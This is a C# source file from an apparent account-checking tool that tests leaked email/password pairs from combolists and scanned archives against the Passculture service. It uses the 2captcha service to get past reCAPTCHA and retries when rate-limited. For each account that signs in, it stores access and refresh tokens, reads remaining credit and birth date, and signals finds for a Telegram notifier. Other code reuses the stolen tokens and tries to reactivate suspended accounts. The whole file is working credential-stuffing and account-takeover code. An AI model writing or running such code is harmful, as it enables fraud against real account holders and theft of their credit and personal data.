using DataVortex.Core.Abstractions;
using DataVortex.Core.Models;
using DataVortex.Core.Passculture;
using Microsoft.Extensions.Logging;

namespace DataVortex.Core.Accounts;

/// <summary>
/// The single, shared path for testing one credential against Passculture. Every caller (live processing,
/// the startup catch-up scan, and the manual "Test accounts" button) goes through here, so an account is
/// reserved atomically in <see cref="IAccountTestRegistry"/> and sent to the backend at most once — no
/// matter how many records or files contain it, across workers and across restarts.
/// </summary>
public static class AccountTester
{
    private const int MaxCheckRetries = 3; // extra attempts on non-definitive responses (so up to 4 total)
    private static volatile SemaphoreSlim _gate = new(10, 10);
    private static int _maxParallel = 10;
    private static ILogger? _log;

    /// <summary>Raised when a credential is abandoned after exhausting retries (non-definitive responses).
    /// The UI uses it to count the RETRY category (these accounts are not persisted, so they stay retryable).</summary>
    public static event Action? RetryAbandoned;

    /// <summary>Raised once for every freshly-tested account that came back successful (HTTP 200), carrying the
    /// full outcome. Subscribers (e.g. the Telegram notifier) filter by category/credit.</summary>
    public static event Action<CredentialEntry>? AccountFound;

    /// <summary>Wires a logger so the checker emits live per-account traces (captcha request, sign-in,
    /// 429 retries, result). Set once at startup; logging is a no-op until then.</summary>
    public static void SetLogger(ILogger logger) => _log = logger;

    /// <summary>Sets the global cap on concurrent backend checks (clamped 1..10). Applied at startup and on Save.
    /// Existing in-flight checks keep their own gate; only new checks see the new cap.</summary>
    public static void ConfigureParallelism(int max)
    {
        max = Math.Clamp(max, 1, 10);
        if (max == _maxParallel) return;
        _maxParallel = max;
        _gate = new SemaphoreSlim(max, max);
    }

    /// <summary>Tests a credential at most once globally. Returns the credential updated with the outcome,
    /// or unchanged if it was already tested, has no identity, or is being tested elsewhere right now.</summary>
    public static async Task<CredentialEntry> TestOnceAsync(
        PasscultureClient passClient, IAccountTestRegistry registry, CredentialEntry cred, CancellationToken ct = default)
    {
        if (cred.Tested) return cred;
        // passculture authenticates by email only — skip any identifier without '@' (scanner noise: truncated
        // names, phone numbers, etc.) so no captcha is ever spent on something that can't possibly sign in.
        if (string.IsNullOrWhiteSpace(cred.Username) || !cred.Username.Contains('@')) return cred;
        if (string.IsNullOrWhiteSpace(cred.Password)) return cred;

        // Already known? reuse the stored outcome without touching the backend.
        if (registry.TryGet(cred.Username, cred.Password, out var known))
            return Apply(cred, known);

        // Claim it atomically; if anyone else holds it, do not send a duplicate.
        if (!registry.TryReserve(cred.Username, cred.Password, cred.Url))
            return cred;

        // Global cap on concurrent backend calls (combolist, archive flow and manual button all share it).
        var gate = _gate;
        await gate.WaitAsync(ct).ConfigureAwait(false);
        try
        {
            for (int attempt = 0; ; attempt++)
            {
                if (attempt > 0)
                {
                    // Backoff before retrying a non-definitive response (429 / 5xx / network / captcha failure).
                    var delay = TimeSpan.FromSeconds(Math.Min(30, 2 * Math.Pow(2, attempt - 1))); // 2,4,8,…
                    await Task.Delay(delay, ct).ConfigureAwait(false);
                }

                // A reCAPTCHA token is single-use, so we solve a FRESH captcha for every attempt.
                _log?.LogInformation("Check {Email}: demande d'un captcha à 2captcha (essai {Attempt})", cred.Username, attempt + 1);
                var captcha = await passClient.SolveCaptchaAsync(ct).ConfigureAwait(false);
                if (captcha is null)
                {
                    _log?.LogWarning("Check {Email}: captcha non résolu (essai {Attempt})", cred.Username, attempt + 1);
                    if (attempt < MaxCheckRetries) continue;
                    RetryAbandoned?.Invoke();
                    registry.Release(cred.Username, cred.Password);
                    return cred;
                }

                _log?.LogInformation("Check {Email}: POST signin → backend Passculture (essai {Attempt})", cred.Username, attempt + 1);
                var signin = await passClient.SignInAsync(cred.Username ?? "", cred.Password ?? "", captcha, ct).ConfigureAwait(false);

                // Classify the response. Definitive outcomes (valid, wrong password, or a recognised custom 400
                // such as EMAIL_NOT_VALIDATED) are stored; everything else (429 / 5xx / 0 / low-trust 400) retries.
                var verdict = signin.StatusCode == 200 ? SignInVerdict.Valid
                            : signin.StatusCode == 400 ? Classify400(signin.Raw)
                            : SignInVerdict.Retry;

                if (verdict != SignInVerdict.Retry)
                {
                    var success = verdict == SignInVerdict.Valid;
                    decimal? credit = null;
                    string? birth = null;
                    string? meStatus = null;
                    DateTime? meEligEnd = null;
                    if (success && signin.AccessToken is not null)
                    {
                        // /me is best-effort but transient failures used to leave a valid account with a null
                        // credit forever, so retry it a few times before giving up.
                        for (int meTry = 0; meTry < 3; meTry++)
                        {
                            try
                            {
                                var me = await passClient.GetMeAsync(signin.AccessToken, ct).ConfigureAwait(false);
                                if (me.Success) { credit = me.DomainsCreditRemaining; birth = me.BirthDate; meStatus = me.StatusType; meEligEnd = me.EligibilityEnd; break; }
                            }
                            catch { /* transient */ }
                            if (meTry < 2) await Task.Delay(TimeSpan.FromSeconds(1 + meTry), ct).ConfigureAwait(false);
                        }
                    }

                    // Valid: the /me status refines the category (ex_beneficiary / aged-out non_eligible → EXPIRE,
                    // still-eligible non_eligible → CUSTOM). A custom 400 carries its code (EMAIL_NOT_VALIDATED →
                    // CUSTOM); a wrong-password 400 → INVALIDE.
                    var state = verdict switch
                    {
                        SignInVerdict.Valid => RefineState(signin.AccountState, meStatus, meEligEnd),
                        SignInVerdict.Definitive => Definitive400Code(signin.Raw),
                        _ => null
                    };

                    _log?.LogInformation("Check {Email}: ← HTTP {Code} → {Verdict}{Credit}",
                        cred.Username, signin.StatusCode,
                        verdict switch
                        {
                            SignInVerdict.Valid => "VALIDE",
                            SignInVerdict.WrongPassword => "mot de passe incorrect",
                            _ => state ?? "?"
                        },
                        success ? $" (crédit={credit})" : "");

                    var result = new AccountTestResult(
                        success, signin.StatusCode, signin.AccessToken, signin.RefreshToken,
                        credit, birth, signin.Raw, DateTime.UtcNow, state);
                    registry.Complete(cred.Username, cred.Password, result);
                    var applied = Apply(cred, result);
                    if (success) AccountFound?.Invoke(applied); // notifier filters by category/credit
                    return applied;
                }

                // Non-definitive (429 / 5xx / 0 / …) → retry up to the cap, else give up (retryable later).
                if (attempt < MaxCheckRetries)
                {
                    _log?.LogWarning("Check {Email}: HTTP {Code} (non définitif) → nouvel essai ({Attempt}/{Max})",
                        cred.Username, signin.StatusCode, attempt + 1, MaxCheckRetries);
                    continue;
                }

                _log?.LogWarning("Check {Email}: abandonné après {Total} essai(s) (dernier HTTP {Code}) — réessayable plus tard",
                    cred.Username, MaxCheckRetries + 1, signin.StatusCode);
                RetryAbandoned?.Invoke();
                registry.Release(cred.Username, cred.Password);
                return cred;
            }
        }
        catch
        {
            registry.Release(cred.Username, cred.Password);
            return cred;
        }
        finally
        {
            gate.Release();
        }
    }

    /// <summary>Re-checks an already-tested account by reusing its stored tokens — no captcha, no sign-in. It
    /// re-verifies the <b>status</b> (an account may have gone ACTIVE → SUSPENDED) and refreshes credit + birth
    /// date. Mints a fresh access token from the refresh token; a rejection while the refresh token has NOT yet
    /// expired, or a <c>/me</c> 401/403, is treated as a suspension. Transient failures leave the account
    /// untouched (retryable later). Returns whether it was updated, whether a credit was read, and whether it
    /// was downgraded to suspended.</summary>
    public static async Task<(bool updated, bool gotCredit, bool suspended)> RefreshCreditAsync(
        PasscultureClient passClient, IAccountTestRegistry registry, AccountRecord account, CancellationToken ct = default)
    {
        if (string.IsNullOrEmpty(account.RefreshToken)) return (false, false, false);

        var refresh = await passClient.RefreshAccessTokenAsync(account.RefreshToken!, ct).ConfigureAwait(false);

        // A 401/403 here is NOT a reliable ban signal: it's usually a blocked proxy IP (403 served by the
        // proxy/CDN) or a rotated refresh token, NOT a real suspension. So we never reclassify to SUSPENDED on
        // an auth failure — only a successful /me updates the account; anything else leaves it untouched.
        var access = refresh.AccessToken ?? account.AccessToken;
        if (string.IsNullOrEmpty(access)) return (false, false, false);

        // /me can fail transiently (flaky proxy IP / 429 / 5xx), so retry it a few times like the live flow does —
        // a single-shot /me used to leave reachable accounts stuck in their old category (e.g. a non_eligible kept
        // as VALIDE). Still zero captcha. An auth failure (401/403) is NOT a ban signal: after the retries we just
        // leave the account untouched rather than downgrade it.
        for (int meTry = 0; meTry < 3; meTry++)
        {
            MeResult me;
            try { me = await passClient.GetMeAsync(access!, ct).ConfigureAwait(false); }
            catch { me = new MeResult { Success = false }; }

            if (me.Success)
            {
                // Reachable: refresh credit + birth, refine status (EXPIRE/CUSTOM), and keep a rotated refresh token.
                var refreshToken = string.IsNullOrWhiteSpace(refresh.RefreshToken) ? account.RefreshToken : refresh.RefreshToken;
                Persist(registry, account, access, me.DomainsCreditRemaining, me.BirthDate,
                    RefineState(account.AccountState, me.StatusType, me.EligibilityEnd), refreshToken);
                _log?.LogInformation("Recheck {Email}: ok, crédit={Credit}", account.Email, me.DomainsCreditRemaining);
                return (true, me.DomainsCreditRemaining is not null, false);
            }

            if (meTry < 2) await Task.Delay(TimeSpan.FromSeconds(1 + meTry), ct).ConfigureAwait(false);
        }

        return (false, false, false); // 3 failed /me → couldn't verify → leave the account as-is (no false downgrade)
    }

    /// <summary>Attempts to reactivate a user-reversible suspension (RECUP) via
    /// <c>POST /native/v1/account/unsuspend</c>. A suspended-UPON_USER_REQUEST account can still authenticate, so
    /// we first mint an access token from the stored refresh token (zero captcha); if that fails we fall back to a
    /// fresh sign-in (one captcha). On success (204) the account is re-read and persisted as ACTIVE → it moves to
    /// VALIDE. The backend enforces the real conditions (feature flag, reason = UPON_USER_REQUEST, within the
    /// delay) and answers 403 otherwise — in which case the account is left as RECUP.</summary>
    public static async Task<(bool ok, string message)> TryUnsuspendAsync(
        PasscultureClient passClient, IAccountTestRegistry registry, AccountRecord account, CancellationToken ct = default)
    {
        // 1) Get an access token — refresh-token path first (no captcha).
        string? access = null, refreshToken = account.RefreshToken;
        if (!string.IsNullOrEmpty(account.RefreshToken))
        {
            var r = await passClient.RefreshAccessTokenAsync(account.RefreshToken!, ct).ConfigureAwait(false);
            if (!string.IsNullOrWhiteSpace(r.AccessToken))
            {
                access = r.AccessToken;
                if (!string.IsNullOrWhiteSpace(r.RefreshToken)) refreshToken = r.RefreshToken;
            }
        }

        // 2) Fall back to a real sign-in (one captcha) — a reversible suspension still signs in (allow_inactive).
        if (string.IsNullOrWhiteSpace(access))
        {
            var captcha = await passClient.SolveCaptchaAsync(ct).ConfigureAwait(false);
            if (captcha is null) return (false, $"{account.Email} : captcha non résolu — réactivation impossible.");
            var signin = await passClient.SignInAsync(account.Email, account.Password, captcha, ct).ConfigureAwait(false);
            if (!string.IsNullOrWhiteSpace(signin.AccessToken))
            {
                access = signin.AccessToken;
                if (!string.IsNullOrWhiteSpace(signin.RefreshToken)) refreshToken = signin.RefreshToken;
            }
        }

        if (string.IsNullOrWhiteSpace(access))
            return (false, $"{account.Email} : impossible d'obtenir un token (refresh expiré ?).");

        // 3) Reactivate, then re-read /me and persist as ACTIVE so the account becomes VALIDE with fresh credit.
        var status = await passClient.UnsuspendAsync(access!, ct).ConfigureAwait(false);
        if (status is 200 or 204)
        {
            decimal? credit = account.Credit;
            string? birth = account.BirthDate;
            try
            {
                var me = await passClient.GetMeAsync(access!, ct).ConfigureAwait(false);
                if (me.Success) { credit = me.DomainsCreditRemaining; birth = me.BirthDate; }
            }
            catch { /* best-effort */ }
            Persist(registry, account, access, credit, birth, "ACTIVE", refreshToken);
            _log?.LogInformation("Unsuspend {Email}: réactivé (HTTP {Code})", account.Email, status);
            return (true, $"{account.Email} : réactivé ✔");
        }

        _log?.LogWarning("Unsuspend {Email}: refusé (HTTP {Code})", account.Email, status);
        return (false, status == 403
            ? $"{account.Email} : réactivation refusée (403 — feature désactivée, hors délai, ou suspension non éligible)."
            : $"{account.Email} : réactivation échouée (HTTP {status}).");
    }

    private static void Persist(IAccountTestRegistry registry, AccountRecord a, string? access,
        decimal? credit, string? birth, string? accountState, string? refreshToken = null)
    {
        var result = new AccountTestResult(
            a.Success, a.StatusCode, access, refreshToken ?? a.RefreshToken,
            credit ?? a.Credit, birth ?? a.BirthDate, a.Message, DateTime.UtcNow, accountState);
        registry.Complete(a.Email, a.Password, result);
    }

    /// <summary>True only when a 400 sign-in body is a genuine bad-password rejection, e.g.
    /// <c>{"general":["Identifiant ou Mot de passe incorrect"]}</c>. Other 400s (notably a too-low captcha
    /// trust score) must NOT be treated as definitive — the caller retries them with a fresh captcha.</summary>
    public static bool IsWrongPassword(string? raw)
    {
        if (string.IsNullOrEmpty(raw)) return false;
        return raw.Contains("mot de passe incorrect", StringComparison.OrdinalIgnoreCase)
            || raw.Contains("identifiant ou mot de passe", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Refines a valid sign-in's account state with the finer <c>/me</c> status: an ex-beneficiary's
    /// credit has expired (→ EXPIRE), a non-eligible account isn't a beneficiary (→ CUSTOM). A "bad" sign-in
    /// state (suspended/etc.) is kept as-is. Returns the state to store so the category resolves correctly.</summary>
    public static string? RefineState(string? signinState, string? meStatusType, DateTime? eligibilityEnd = null)
    {
        // A bad (BAN) or user-reversible (RECUP) sign-in state is authoritative — never let /me override it.
        if (AccountTestRegistry.IsBadState(signinState) || AccountTestRegistry.IsRecoverableState(signinState)) return signinState;
        if (string.Equals(meStatusType, "ex_beneficiary", StringComparison.OrdinalIgnoreCase)) return "ex_beneficiary";
        if (string.Equals(meStatusType, "non_eligible", StringComparison.OrdinalIgnoreCase))
            // non_eligible + eligibility window already CLOSED (aged out, never an active deposit) = expired
            // opportunity → EXPIRE. Still within / before the window (e.g. a minor not eligible yet) → CUSTOM.
            return eligibilityEnd is { } end && end < DateTime.UtcNow ? "eligibility_expired" : "non_eligible";
        // "eligible" = can still become a beneficiary but hasn't activated a deposit (no credit yet, ID/subscription
        // to complete) → not VALIDE → CUSTOM. Stored as its own marker so Categorize routes it to CUSTOM.
        if (string.Equals(meStatusType, "eligible", StringComparison.OrdinalIgnoreCase)) return "eligible";
        return signinState;
    }

    private enum SignInVerdict { Valid, WrongPassword, Definitive, Retry }

    /// <summary>Recognised definitive (non-valid) 400 reason codes — stored instead of retried forever. The
    /// final category is decided by <see cref="AccountTestRegistry.Categorize"/> from the code stored as the
    /// account state (e.g. ACCOUNT_DELETED → BAN, EMAIL_NOT_VALIDATED → CUSTOM).</summary>
    private static readonly string[] Definitive400Codes = { "EMAIL_NOT_VALIDATED", "ACCOUNT_DELETED", "ACCOUNT_ANONYMIZED" };

    /// <summary>Returns the matched definitive-400 code when the body is a recognised non-retryable 400,
    /// otherwise null (→ retry).</summary>
    public static string? Definitive400Code(string? raw)
    {
        if (string.IsNullOrEmpty(raw)) return null;
        foreach (var code in Definitive400Codes)
            if (raw.Contains(code, StringComparison.OrdinalIgnoreCase)) return code;
        return null;
    }

    private static SignInVerdict Classify400(string? raw)
    {
        if (IsWrongPassword(raw)) return SignInVerdict.WrongPassword;
        return Definitive400Code(raw) is not null ? SignInVerdict.Definitive : SignInVerdict.Retry;
    }

    /// <summary>Folds a registry outcome back into a <see cref="CredentialEntry"/> (for the per-file record).</summary>
    public static CredentialEntry Apply(CredentialEntry cred, AccountTestResult r)
        => cred with
        {
            Tested = true,
            TestSuccess = r.Success,
            TestMessage = r.Message,
            TestedUtc = r.TestedUtc,
            AccessToken = r.AccessToken,
            RefreshToken = r.RefreshToken,
            Credit = r.Credit,
            BirthDate = r.BirthDate,
            StatusCode = r.StatusCode,
            AccountState = r.AccountState // required so Category resolves correctly (VALIDE/BAN/CUSTOM)
        };
}
